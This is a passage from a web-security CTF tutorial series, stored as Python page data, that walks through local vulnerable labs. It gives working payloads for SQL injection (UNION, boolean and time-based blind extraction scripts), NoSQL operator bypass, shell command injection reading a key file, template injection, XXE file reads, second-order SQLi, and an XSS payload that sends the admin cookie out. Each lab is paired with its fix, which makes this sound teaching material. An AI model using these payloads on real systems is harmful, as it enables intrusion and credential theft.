    "meta": "Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time.",
    "deck": "A beginner-friendly CTF tutorial: turn a broken search query into a database read, then extract secrets when the application reveals only a boolean—or only its response time.",
    "next": ("/guides/injection-beyond-sql/", "Next in the series", "Injection Beyond SQL", "The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p>In <a href="/guides/jwt-attacks/">JWT Attacks</a>, we modified authentication tokens and tested whether the server verified them correctly. In this article, we will follow user input across another trust boundary: from an HTTP request into a database query.</p>
<p>Using Labs 12–14 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>, we will learn three forms of SQL injection:</p>
<ul>
<li><strong>UNION-based SQL injection</strong>, where database rows appear in the response;</li>
<li><strong>boolean-based blind SQL injection</strong>, where the application reveals one bit through <code>true</code> or <code>false</code>; and</li>
<li><strong>time-based blind SQL injection</strong>, where the response body never changes but its timing does.</li>
</ul>
<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to capture normal requests, change one query parameter, and measure differences in status, size, and response time.</p>
<p>These are deliberately vulnerable local labs. SQL injection can expose or destroy real data, so only test systems you own or have explicit authorization to assess.</p>
<h2 id="before-we-begin">Before we begin</h2>
<p>You need Python 3.11 or later, h5i, and its <code>websec</code> plugin. The <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">tutorial README</a> contains the complete setup.</p>
<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
$ cd h5i-tutorial/websec
$ h5i websec --help
</code></pre>
<h2 id="what-is-sql-injection">What is SQL injection?</h2>
<p>Applications use SQL to read and modify relational databases. A safe query keeps its instructions separate from user-supplied values.</p>
<p>For example:</p>
<pre><code class="language-python">db.execute(
    &quot;SELECT id, name, price FROM products WHERE name LIKE ?&quot;,
    (f&quot;%{search}%&quot;,),
)
</code></pre>
<p>The question mark is a parameter placeholder. The database treats <code>search</code> as data, even when it contains quotes or SQL keywords.</p>
<p>A vulnerable application may instead construct the query as text:</p>
<pre><code class="language-python">sql = (
    &quot;SELECT id, name, price FROM products &quot;
    f&quot;WHERE name LIKE '%{search}%'&quot;
)
</code></pre>
<p>If <code>search</code> contains a quote, it can end the string literal and turn the remaining input into SQL syntax. This is <strong>SQL injection</strong>.</p>
<h2 id="lab-12-make-the-database-print-another-table">Lab 12: make the database print another table</h2>
<p>Start the catalogue lab:</p>
<pre><code class="language-bash">$ ./run.sh 12
</code></pre>
<p>Open a normal product search:</p>
<pre><code class="language-bash">$ h5i browser open \
  'http://127.0.0.1:9120/api/products?q=compass' \
  --session lab12 --new --capture
$ h5i websec show res_0 --session lab12 --raw
</code></pre>
<p>The response contains two products whose names include “compass.” Before trying a full payload, send one quote:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
  --set &quot;query.q=compass'&quot;
$ h5i websec show res_1 --session lab12 --raw
</code></pre>
<p>The application returns <code>500</code> and shows the query it attempted:</p>
<pre><code class="language-json">{
  &quot;error&quot;: &quot;unrecognized token: \&quot;'\&quot;&quot;,
  &quot;sql&quot;: &quot;SELECT id, name, price FROM products WHERE name LIKE '%compass'%'&quot;
}
</code></pre>
<p>Our quote ended the original string early. The final <code>%'</code> supplied by the application is now misplaced SQL syntax.</p>
<p>A single error is a lead, not yet proof. A stronger test compares opposite conditions:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
  --set &quot;query.q=compass%' AND '1'='1' -- &quot;

$ h5i websec replay req_0 --session lab12 \
  --set &quot;query.q=compass%' AND '1'='2' -- &quot;
</code></pre>
<p>If the first retains the original results and the second removes them, our input changed the query’s logic—not merely its syntax.</p>
<h3 id="count-the-result-columns">Count the result columns</h3>
<p>SQL’s <code>UNION</code> operator combines rows from two queries. Both sides must return the same number of columns in compatible positions.</p>
<p>The normal response contains <code>id</code>, <code>name</code>, and <code>price</code>, suggesting three columns. We can verify that with <code>ORDER BY</code>:</p>
<pre><code class="language-bash">$ for n in 1 2 3 4 5; do
    printf '%s ' &quot;$n&quot;
    h5i websec replay req_0 --session lab12 \
      --reset-budget \
      --set &quot;query.q=zz%' ORDER BY $n -- &quot; |
      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;response&quot;][&quot;status&quot;])'
  done
</code></pre>
<p>The result is:</p>
<pre><code class="language-text">1 200
2 200
3 200
4 500
5 500
</code></pre>
<p>Ordering by the fourth column fails, so the original query returns three columns.</p>
<h3 id="discover-the-table">Discover the table</h3>
<p>This lab uses SQLite. SQLite stores information about tables in <code>sqlite_master</code>. Inject a second three-column query:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
  --set &quot;query.q=zz%' UNION SELECT 1, name, 0 FROM sqlite_master WHERE type='table' -- &quot;
</code></pre>
<p>Note the <code>seq</code> from the replay output and inspect its <code>res_N</code>. The result lists both <code>products</code> and <code>api_keys</code>.</p>
<p>The leading <code>zz%</code> makes the original product search return no rows. This keeps the output focused on rows introduced by our <code>UNION</code>.</p>
<p>Now read the secret:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
  --set &quot;query.q=zz%' UNION SELECT id, secret, 0 FROM api_keys -- &quot;
</code></pre>
<p>Inspect the new response. The injected row contains:</p>
<pre><code class="language-text">FLAG{sqli_union}
</code></pre>
<p>The <code>--</code> at the end comments out the remaining quote and percent sign from the original query. Keeping a space after <code>--</code> also makes the payload compatible with SQL engines that require whitespace after the comment marker.</p>
<h3 id="why-did-this-work">Why did this work?</h3>
<p>The vulnerable handler directly inserts the search value into SQL:</p>
<pre><code class="language-python">q = req.query.get(&quot;q&quot;, &quot;&quot;)
sql = (
    &quot;SELECT id, name, price FROM products &quot;
    f&quot;WHERE name LIKE '%{q}%'&quot;
)
rows = db().execute(sql).fetchall()
</code></pre>
<p>The fix is parameterization:</p>
<pre><code class="language-python">rows = db().execute(
    &quot;SELECT id, name, price FROM products WHERE name LIKE ?&quot;,
    (f&quot;%{q}%&quot;,),
).fetchall()
</code></pre>
<p>Escaping individual dangerous characters is fragile. Parameterization prevents the value from becoming SQL syntax at all.</p>
<h2 id="lab-13-extract-a-secret-through-a-boolean">Lab 13: extract a secret through a boolean</h2>
<p>Lab 12 printed database rows in the response. Many applications do not.</p>
<p>Start the waitlist lab:</p>
<pre><code class="language-bash">$ ./run.sh 13
</code></pre>
<p>Its endpoint answers only whether an email address is on the list:</p>
<pre><code class="language-bash">$ h5i browser open \
  'http://127.0.0.1:9130/api/check?email=ada@example.test' \
  --session lab13 --new --capture
$ h5i websec show res_0 --session lab13 --raw
</code></pre>
<pre><code class="language-json">{&quot;on_list&quot;: true}
</code></pre>
<p>When injection exists but the application does not directly print query results or database errors, it is called <strong>blind SQL injection</strong>.</p>
<p>“Blind” does not mean that no information escapes. It means we need to identify a smaller signal and ask the database a series of questions.</p>
<h3 id="establish-a-boolean-oracle">Establish a boolean oracle</h3>
<p>An <strong>oracle</strong> is a behavior that answers a question about otherwise hidden data.</p>
<p>Send two payloads that differ only in whether their predicate is true:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab13 \
  --set &quot;query.email=zz' OR (1=1) -- &quot;

$ h5i websec replay req_0 --session lab13 \
  --set &quot;query.email=zz' OR (1=2) -- &quot;
</code></pre>
<p>The first response contains:</p>
<pre><code class="language-json">{&quot;on_list&quot;: true}
</code></pre>
<p>The second contains:</p>
<pre><code class="language-json">{&quot;on_list&quot;: false}
</code></pre>
<p>We can now replace <code>1=1</code> with a question about the hidden voucher code:</p>
<pre><code class="language-sql">(SELECT unicode(substr(code,1,1)) FROM vouchers) &gt; 79
</code></pre>
<p>This asks whether the numeric value of the first character is greater than 79.</p>
<h3 id="read-the-signal-without-fetching-every-body">Read the signal without fetching every body</h3>
<p>The JSON response containing <code>true</code> is 17 bytes; the response containing <code>false</code> is 18. h5i includes the response size in the normal JSON output from <code>replay</code>, so a loop can branch on that number.</p>
<p>Define a small function:</p>
<pre><code class="language-bash">$ ask() {
    h5i websec replay req_0 --session lab13 \
      --reset-budget \
      --set &quot;query.email=zz' OR ($1) -- &quot; |
      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;response&quot;][&quot;bytes&quot;])'
  }

$ TRUE_BYTES=$(ask &quot;1=1&quot;)
</code></pre>
<p><code>--reset-budget</code> matters because extracting a secret requires many requests. Without it, the session’s bounded network allowance could stop the loop partway through and make the remaining answers look false.</p>
<h3 id="binary-search-each-character">Binary-search each character</h3>
<p>Trying every printable character could require dozens of questions per position. A binary search halves the remaining range after every answer and needs about seven questions for a printable ASCII character.</p>
<p>The following loop first checks the secret’s length, then extracts each character:</p>
<pre><code class="language-bash">$ OUT=&quot;&quot;

$ for i in $(seq 1 64); do
    if [ &quot;$(ask &quot;(SELECT length(code) FROM vouchers) &lt; $i&quot;)&quot; = &quot;$TRUE_BYTES&quot; ]; then
      break
    fi

    LO=32
    HI=126

    while [ &quot;$LO&quot; -lt &quot;$HI&quot; ]; do
      MID=$(( (LO + HI) / 2 ))

      if [ &quot;$(ask &quot;(SELECT unicode(substr(code,$i,1)) FROM vouchers) &gt; $MID&quot;)&quot; = &quot;$TRUE_BYTES&quot; ]; then
        LO=$((MID + 1))
      else
        HI=$MID
      fi
    done

    OUT=&quot;$OUT$(printf &quot;\\$(printf '%03o' &quot;$LO&quot;)&quot;)&quot;
    printf '\r%s' &quot;$OUT&quot;
  done

$ printf '\n%s\n' &quot;$OUT&quot;
FLAG{sqli_blind_boolean}
</code></pre>
<p>Each request leaks only one yes-or-no answer. Together, those answers reconstruct the entire value.</p>
<h3 id="why-did-this-work_1">Why did this work?</h3>
<p>The endpoint builds another query through string concatenation:</p>
<pre><code class="language-python">sql = f&quot;SELECT 1 FROM members WHERE email = '{email}'&quot;
found = db().execute(sql).fetchone() is not None
return js({&quot;on_list&quot;: found})
</code></pre>
<p>The application hides database rows and errors, but it exposes whether the query returned a row. Hiding output reduces the bandwidth of the vulnerability; it does not remove the vulnerability.</p>
<p>The real fix is still a parameterized query. Rate limits and detection of hundreds of near-identical requests are useful additional defenses, but they do not make concatenated SQL safe.</p>
<h2 id="lab-14-extract-a-secret-through-time">Lab 14: extract a secret through time</h2>
<p>Lab 14 removes even the boolean. Start it:</p>
<pre><code class="language-bash">$ ./run.sh 14
</code></pre>
<p>Open the coupon endpoint:</p>
<pre><code class="language-bash">$ h5i browser open \
  'http://127.0.0.1:9140/api/coupon?code=SPRING10' \
  --session lab14 --new --capture
</code></pre>
<p>Whatever coupon we send, the response is always:</p>
<pre><code class="language-json">{&quot;checked&quot;: true}
</code></pre>
<p>The status and body do not reveal whether the database condition was true. The server can still reveal one thing unintentionally: how long the query took.</p>
<h3 id="build-a-timing-oracle">Build a timing oracle</h3>
<p>The lab registers a SQLite function named <code>sleep</code>. Use it only when a predicate is true:</p>
<pre><code class="language-sql">zz' OR (
  SELECT CASE
    WHEN (1=1) THEN sleep(0.4)
    ELSE 0
  END
  FROM staff
  WHERE name='admin'
) --
</code></pre>
<p>Calibrate the difference with repeated samples:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab14 --repeat 5 \
  --set &quot;query.code=zz' OR (SELECT CASE WHEN (1=1) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot;

$ h5i websec replay req_0 --session lab14 --repeat 5 \
  --set &quot;query.code=zz' OR (SELECT CASE WHEN (1=2) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot;
</code></pre>
<p><code>--repeat 5</code> reports every sample together with the median and median absolute deviation. These are more robust than relying on one request that may be delayed by unrelated system activity.</p>
<p>For this local lab, a threshold of 250 milliseconds cleanly separates the normal and delayed responses.</p>
<h3 id="extract-the-six-digit-pin">Extract the six-digit PIN</h3>
<p>Define a function that returns one timing measurement:</p>
<pre><code class="language-bash">$ ms() {
    h5i websec replay req_0 --session lab14 \
      --reset-budget \
      --set &quot;query.code=zz' OR (SELECT CASE WHEN ($1) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot; |
      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;samples&quot;][0][&quot;total_ms&quot;])'
  }
</code></pre>
<p>Network and scheduler noise can make a fast request look slow. A sleeping server cannot answer early. We therefore trust a fast result and confirm every slow result:</p>
<pre><code class="language-bash">$ THRESHOLD=250

$ truth() {
    [ &quot;$(ms &quot;$1&quot;)&quot; -lt &quot;$THRESHOLD&quot; ] &amp;&amp; return 1
    [ &quot;$(ms &quot;$1&quot;)&quot; -lt &quot;$THRESHOLD&quot; ] &amp;&amp; return 1
    return 0
  }
</code></pre>
<p>The PIN contains only digits, so search character codes 48 through 57 instead of the entire printable range:</p>
<pre><code class="language-bash">$ PIN=&quot;&quot;

$ for i in $(seq 1 6); do
    LO=48
    HI=57

    while [ &quot;$LO&quot; -lt &quot;$HI&quot; ]; do
      MID=$(( (LO + HI) / 2 ))

      if truth &quot;unicode(substr(pin,$i,1)) &gt; $MID&quot;; then
        LO=$((MID + 1))
      else
        HI=$MID
      fi
    done

    PIN=&quot;$PIN$(printf &quot;\\$(printf '%03o' &quot;$LO&quot;)&quot;)&quot;
    printf '\r%s' &quot;$PIN&quot;
  done

$ printf '\n'
471902
</code></pre>
<p>Finally, send the recovered PIN to the vault:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab14 \
  --set path=/api/vault \
  --unset query.code \
  --create --set &quot;query.pin=$PIN&quot;
</code></pre>
<p>The response contains:</p>
<pre><code class="language-text">FLAG{sqli_blind_time}
</code></pre>
<h3 id="why-did-this-work_2">Why did this work?</h3>
<p>The vulnerable query is still simple string concatenation:</p>
<pre><code class="language-python">db().execute(
    f&quot;SELECT 1 FROM coupons WHERE code = '{code}'&quot;
).fetchone()

return js({&quot;checked&quot;: True})
</code></pre>
<p>Returning a constant body and suppressing errors do not stop the injected expression from running. They only force the attacker to use a side channel.</p>
<p>Different database engines expose different delay functions, such as <code>SLEEP</code> in MySQL and <code>pg_sleep</code> in PostgreSQL. Statement timeouts can reduce the channel’s reliability, but parameterization is what removes the injection.</p>
<h2 id="a-reusable-sql-injection-workflow">A reusable SQL injection workflow</h2>
<p>These labs form one progression:</p>
<ol>
<li>Send a quote and look for a change in status, body size, or error behavior.</li>
<li>Confirm control over query logic with a true and a false predicate.</li>
<li>If rows appear in the response, determine the column shape and test a <code>UNION</code>.</li>
<li>If only two response states remain, turn them into a boolean oracle.</li>
<li>If the response is constant, measure whether execution time forms an oracle.</li>
<li>Use binary search and the smallest known character range to reduce requests.</li>
<li>Confirm impact by retrieving a specific protected value.</li>
</ol>
<p>The important habit is to read each probe through three signals: <strong>status, size, and time</strong>. A response does not have to print an SQL error to tell you that something changed.</p>
<h2 id="summary">Summary</h2>
<p>Lab 12 let us place rows from <code>api_keys</code> into a product search response with <code>UNION</code>. Lab 13 exposed only a boolean, but that one bit per request was enough to reconstruct a voucher code. Lab 14 returned an entirely constant body, yet conditional delays revealed a six-digit PIN.</p>
<p>All three vulnerabilities had the same root cause: user input was concatenated into SQL. Error suppression and constant responses changed the exploitation technique, not the underlying bug.</p>
<p>When finished:</p>
<pre><code class="language-bash">$ h5i browser close --session lab12
$ h5i browser close --session lab13
$ h5i browser close --session lab14
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/injection-beyond-sql/">Injection Beyond SQL</a>, we will continue beyond relational databases: NoSQL operator injection, shell command injection, server-side template injection, XXE, and second-order SQL injection.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/12-sqli-union">Lab 12: UNION SQL injection</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/13-sqli-blind-boolean">Lab 13: Boolean-based blind SQL injection</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/14-sqli-blind-time">Lab 14: Time-based blind SQL injection</a></li>
</ul>""",
}


INJECTION_LABS = {
    "section": "guides", "slug": "injection-beyond-sql", "published": "2026-09-13",
    "eyebrow": "Tutorial 05 / Injection", "time": "6 min",
    "tags": "NoSQL &middot; Command &middot; SSTI &middot; XXE &middot; Labs 15&ndash;19",
    "title": "Injection Beyond SQL | h5i web security tutorial",
    "h1": "Injection Beyond SQL",
    "description": "A beginner-friendly CTF tutorial: cross the boundaries between JSON, shells, templates, XML, and stored data.",
    "meta": "The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input.",
    "deck": "A beginner-friendly CTF tutorial: cross the boundaries between JSON, shells, templates, XML, and stored data.",
    "next": ("/guides/browser-as-a-weapon/", "Next in the series", "The Browser as a Weapon", "Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p><a href="/guides/sql-injection/">SQL Injection</a> covered SQL injection. SQL is only one interpreter that may receive attacker-controlled input. In this article, Labs 15–19 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> show the same underlying mistake in five different forms.</p>
<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to test NoSQL operators, shell commands, template expressions, XML entities, and a payload that becomes dangerous only after it is stored.</p>
<p>These are intentionally vulnerable local applications. Only test systems you own or have permission to assess.</p>
<h2 id="the-common-shape-of-injection">The common shape of injection</h2>
<p>Injection happens when one system treats data as instructions for another system. The important question is not only “Which characters are blocked?” but:</p>
<blockquote>
<p>Which interpreter receives this value next?</p>
</blockquote>
<p>A JSON value may become a database operator. A search term may enter a shell command. An SVG may be parsed as XML. A string safely stored today may be concatenated into SQL tomorrow.</p>
<h2 id="lab-15-nosql-operator-injection">Lab 15: NoSQL operator injection</h2>
<p>Start the lab and capture the homepage:</p>
<pre><code class="language-bash">$ ./run.sh 15
$ h5i browser open 'http://127.0.0.1:9150/' \
  --session lab15 --new --capture
</code></pre>
<p>The login endpoint expects JSON. Instead of sending a password string, send an object:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab15 --create \
  --set method=POST --set path=/api/login \
  --set header.Content-Type=application/json \
  --set json.username=admin \
  --set 'json.password={&quot;$gt&quot;:&quot;&quot;}'
</code></pre>
<p>The response contains <code>FLAG{nosql_operator}</code>.</p>
<p><code>$gt</code> means “greater than” in MongoDB-style query syntax. Every nonempty password hash is greater than the empty string, so the predicate matches the admin record without knowing its password.</p>
<p>The vulnerable code passes the request’s shape into the query:</p>
<pre><code class="language-python">query = {
    &quot;username&quot;: payload[&quot;username&quot;],
    &quot;password&quot;: payload[&quot;password&quot;],
}
user = collection.find_one(query)
</code></pre>
<p>Validation must check types as well as field names. <code>password</code> must be a string, and the application should compare a password using its intended password-verification function rather than constructing a client-controlled query.</p>
<h2 id="lab-16-command-injection-past-a-blocklist">Lab 16: command injection past a blocklist</h2>
<p>Start the log-search lab:</p>
<pre><code class="language-bash">$ ./run.sh 16
$ h5i browser open \
  'http://127.0.0.1:9160/api/logs/search?q=ERROR' \
  --session lab16 --new --capture
</code></pre>
<p>The server blocks familiar shell metacharacters such as <code>&amp;&amp;</code>, <code>|</code>, backticks, and <code>$(</code>. But the query is placed inside a quoted shell command. Close the quote, add a command separated by <code>;</code>, then reopen it:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab16 \
  --set &quot;query.q=zz'; ls; echo '&quot;
</code></pre>
<p>The output reveals <code>deploy.key</code>. Read it:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab16 \
  --set &quot;query.q=zz'; cat deploy.key; echo '&quot;
</code></pre>
<p>The response contains <code>FLAG{command_injection}</code>.</p>
<p>A blocklist tries to enumerate every dangerous spelling in a language designed to combine commands. It will miss alternatives.</p>
<p>The fix is to avoid a shell:</p>
<pre><code class="language-python">subprocess.run(
    [&quot;grep&quot;, &quot;--fixed-strings&quot;, query, logfile],
    capture_output=True,
)
</code></pre>
<p>Passing an argument array keeps the search term as one argument rather than shell syntax. Input validation can still limit length and characters, but it should not be the boundary that prevents command execution.</p>
<h2 id="lab-17-server-side-template-injection">Lab 17: server-side template injection</h2>
<p>Start the postcard preview:</p>
<pre><code class="language-bash">$ ./run.sh 17
$ h5i browser open \
  'http://127.0.0.1:9170/api/preview?tpl=hi' \
  --session lab17 --new --capture
</code></pre>
<p>First, determine whether the template engine evaluates expressions:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab17 \
  --set 'query.tpl={{7*7}}'
</code></pre>
<p>If the response contains <code>49</code>, the input is being evaluated rather than merely displayed.</p>
<p>The lab removes obvious built-ins such as <code>open</code>, but exposes a <code>user</code> object. Python objects can lead back to the globals of the function that created them:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab17 \
  --set 'query.tpl={{user.__init__.__globals__[&quot;VAULT_KEY&quot;]}}'
</code></pre>
<p>The result contains <code>FLAG{ssti_template}</code>.</p>
<p>The mistake is allowing an untrusted user to supply the template itself:</p>
<pre><code class="language-python">render(user_supplied_template, user=user)
</code></pre>
<p>Use a fixed template and pass user input only as data. A restricted environment reduces exposure but is difficult to make safe when rich application objects remain reachable.</p>
<h2 id="lab-18-xxe-through-an-svg-upload">Lab 18: XXE through an SVG upload</h2>
<p>SVG is an image format, but it is also XML. An XML parser may support external entities that load local files or URLs.</p>
<p>Start the avatar lab:</p>
<pre><code class="language-bash">$ ./run.sh 18
$ h5i browser open 'http://127.0.0.1:9180/' \
  --session lab18 --new --capture
</code></pre>
<p>The homepage prints the location of <code>service.env</code>. Create an SVG whose title expands an external entity:</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE svg [
  &lt;!ENTITY leak SYSTEM &quot;file:///PATH/TO/service.env&quot;&gt;
]&gt;
&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
  &lt;title&gt;&amp;leak;&lt;/title&gt;
&lt;/svg&gt;
</code></pre>
<p>Save it as <code>/tmp/avatar.svg</code>, replacing the path with the one shown by the lab. Upload the exact bytes:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab18 --create \
  --set method=POST --set path=/api/avatar \
  --set-file multipart.file=/tmp/avatar.svg \
  --set multipart.file.filename=avatar.svg \
  --set multipart.file.content_type=image/svg+xml
</code></pre>
<p>The parsed title contains <code>FLAG{xxe_svg_upload}</code>.</p>
<p>This is <strong>XML external entity injection</strong>, or <strong>XXE</strong>. Disable DTD and external-entity processing for untrusted XML. For image uploads, decode and re-encode images using a format-specific image library instead of trusting their declared content type.</p>
<h2 id="lab-19-second-order-sql-injection">Lab 19: second-order SQL injection</h2>
<p>An input may be safe in the request that stores it and dangerous in a later operation that reuses it.</p>
<p>Start the lab:</p>
<pre><code class="language-bash">$ ./run.sh 19
$ h5i browser open 'http://127.0.0.1:9190/' \
  --session lab19 --new --capture
</code></pre>
<p>Register a username that contains SQL:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
  --set method=POST --set path=/api/register \
  --set header.Content-Type=application/json \
  --set &quot;json.username=zz' OR username='admin&quot; \
  --set json.password=pw1
</code></pre>
<p>Registration uses a parameterized query, so the payload is stored literally. Now ask to change that user’s password:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
  --set method=POST --set path=/api/password \
  --set header.Content-Type=application/json \
  --set &quot;json.username=zz' OR username='admin&quot; \
  --set json.password=pw1 \
  --set json.new=owned
</code></pre>
<p>The password-change code retrieves the stored username and later concatenates it:</p>
<pre><code class="language-python">sql = f&quot;UPDATE users SET password=? WHERE username='{stored_username}'&quot;
</code></pre>
<p>The stored value becomes SQL syntax and also updates the admin. Log in:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
  --set method=POST --set path=/api/login \
  --set header.Content-Type=application/json \
  --set json.username=admin --set json.password=owned
</code></pre>
<p>The response contains <code>FLAG{second_order_sqli}</code>.</p>
<p>Data does not become trusted because it came from the database. Parameterize every query at the point where it executes.</p>
<h2 id="a-reusable-injection-method">A reusable injection method</h2>
<p>For each input, trace its next interpreter:</p>
<ol>
<li>Change its type as well as its value.</li>
<li>Use a harmless expression such as <code>{{7*7}}</code> before a dangerous payload.</li>
<li>Compare paired inputs that should produce opposite results.</li>
<li>Check uploaded formats for secondary parsers.</li>
<li>Follow stored values into later reads, updates, logs, and exports.</li>
<li>Fix the interpreter boundary: parameterized queries, argument arrays, fixed templates, and safe parsers.</li>
</ol>
<h2 id="summary">Summary</h2>
<p>Labs 15–19 crossed five boundaries, but the failure was the same: untrusted data acquired the grammar of another system. The most important testing skill is recognizing that interpreter and asking what data it considers executable.</p>
<pre><code class="language-bash">$ for s in lab15 lab16 lab17 lab18 lab19; do
    h5i browser close --session &quot;$s&quot;
  done
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/browser-as-a-weapon/">The Browser as a Weapon</a>, the interpreter moves into the victim’s browser: reflected and stored XSS, CSRF, CORS, and OAuth redirects.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/15-nosql-operator">Lab 15: NoSQL operator injection</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/16-command-injection">Lab 16: Command injection</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/17-ssti-template">Lab 17: Server-side template injection</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/18-xxe-svg-upload">Lab 18: XXE through SVG</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/19-second-order-sqli">Lab 19: Second-order SQL injection</a></li>
</ul>""",
}


BROWSERXSS = {
    "section": "guides", "slug": "browser-as-a-weapon", "published": "2026-09-15",
    "eyebrow": "Tutorial 06 / Browser", "time": "7 min",
    "tags": "XSS &middot; CSRF &middot; CORS &middot; OAuth &middot; Labs 20&ndash;24",
    "title": "The Browser as a Weapon | h5i web security tutorial",
    "h1": "The Browser as a Weapon",
    "description": "A beginner-friendly CTF tutorial: make a victim’s browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.",
    "meta": "Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.",
    "deck": "A beginner-friendly CTF tutorial: make a victim’s browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.",
    "next": ("/guides/ssrf-and-file-attacks/", "Next in the series", "SSRF and File Attacks", "Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p><a href="/guides/injection-beyond-sql/">Injection Beyond SQL</a> followed input into server-side interpreters. Labs 20–24 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> move the attack into a victim’s browser.</p>
<p>The central idea is simple: we often do not need to steal a credential. If the victim’s browser already has it, we can sometimes make that browser perform the protected action for us.</p>
<p>The labs run locally and include an automated victim browser. They require h5i to be available on <code>PATH</code>, or through <code>H5I</code>. Only use these techniques with explicit authorization.</p>
<h2 id="lab-20-reflected-xss-past-a-filter">Lab 20: reflected XSS past a filter</h2>
<p>Start the lab:</p>
<pre><code class="language-bash">$ ./run.sh 20
$ h5i browser open 'http://127.0.0.1:9200/' \
  --session lab20 --new --capture
</code></pre>
<p>The search page reflects its <code>q</code> parameter but removes <code>&lt;script&gt;</code> tags. The filter performs only one replacement, so a nested tag survives its own transformation:</p>
<pre><code class="language-text">&lt;scr&lt;script&gt;ipt&gt; ... &lt;/script&gt;
</code></pre>
<p>After the inner <code>&lt;script&gt;</code> is deleted, the remaining halves join into a new <code>&lt;script&gt;</code> tag.</p>
<p>Create a unique collector ID and a payload that sends the admin cookie back:</p>
<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
$ PAYLOAD=&quot;&lt;scr&lt;script&gt;ipt&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(document.cookie))&lt;/script&gt;&quot;
</code></pre>
<p>Confirm that the response really contains a script before asking the admin to visit it:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
  --set path=/search --set &quot;query.q=$PAYLOAD&quot;
</code></pre>
<p>URL-encode the target and report it:</p>
<pre><code class="language-bash">$ TARGET=&quot;http://127.0.0.1:9200/search?q=$(python3 -c \
  'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))' &quot;$PAYLOAD&quot;)&quot;

$ h5i websec replay req_0 --session lab20 --create \
  --set path=/report --set &quot;query.url=$TARGET&quot;
</code></pre>
<p>The admin bot visits the reported URL a few seconds later. Poll the collector until its row appears:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
  --set path=/collected --set &quot;query.id=$ID&quot;
</code></pre>
<p>The body is <code>{"rows": ["session=adm_..."]}</code>. Copy that cookie value and replay the protected request with it:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
  --set path=/admin/flag \
  --set &quot;cookie.session=PASTE_ADMIN_COOKIE&quot;
</code></pre>
